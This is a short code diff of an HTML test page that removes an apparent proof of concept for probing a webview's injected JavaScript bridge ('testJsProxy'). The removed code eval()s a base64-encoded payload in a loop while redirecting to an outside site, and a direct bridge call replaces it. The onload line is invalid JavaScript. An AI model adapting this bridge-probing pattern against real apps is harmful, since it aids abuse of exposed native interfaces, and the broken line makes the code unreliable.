@@ -1,22 +1,7 @@
 hello world!
 <script>
-  function triggerPoc(url){
-  const currUrl = location.href;
-  const payload = `
-  if(!location.href.startsWith("https://ren")&&!window.__cloudx_called){
-  window.__cloudx_called = true;
-  console.log(222222)
-  }`;
-  const base64 = btoa(payload);
-  for(let i=0; i<100; i++){
-  setTimeout(function(){
-  if(window.testJsProxy && typeof window.testJsProxy.test === "function"){
-    console.log(111111)
-  eval(atob(base64));
-  }},i)}
-  location.href = url;
-  }
+  
   window.onload()=function(){
-    triggerPoc("https://www.baidu.com")
+    window.testJsProxy.test()
   }
 </script>
